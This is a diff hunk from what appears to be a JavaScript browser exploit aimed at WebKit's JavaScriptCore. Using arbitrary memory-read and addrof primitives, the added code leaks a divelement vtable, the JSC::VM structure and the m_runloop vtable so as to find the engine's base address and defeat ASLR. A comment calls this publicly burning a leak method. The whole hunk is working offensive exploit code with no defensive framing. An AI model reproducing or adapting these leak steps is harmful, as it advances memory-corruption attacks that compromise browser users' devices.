@@ -639,7 +639,24 @@ function foo(obj) {
         let v_tlb = memory.read_i64(exe_ptr,0);
         log('[+] divelement vtable seems to be at '+v_tlb.toString(16));
         var anchor = memory.read_i64(v_tlb,0);
-        
+         var bb = {};
+        bb[0] = 1.1
+        var bbaddr = memory.addrof(bb);
+        //about to burn a vtable leak method publically RIP
+        var print = log;
+         print("object address?" + hex1(bbaddr));
+        var vm = memory.read_i64((bbaddr & 0xffffc000) + (((bbaddr/0x100000000)|0)*0x100000000) + 0x4000 - 0x120) //should poin
+        print("JSC::VM Struct @" + vm);
+        //m_runloop contains a vtable at offset 0...
+        // m_runloop is + 0x18 from JSC::VMStruct!
+        var m_runloop = memory.read_i64(vm + 0x18);
+        //hopefully points to JavaScriptCore Base!
+        print("m_runloop @ " + m_runloop)
+        var vtable = memory.read_i64(m_runloop);
+        //var jscbase = Sub(vtable, new Int64(vtable).lo() & 0xfff);
+        print("vtable @ " + vtable + "vs" + v_tlb);
+	var anchor1 = memory.read_i64(vtable);
+	print("anchor @" + anchor + "vs" + anchor1);
         
         
         success = 0;
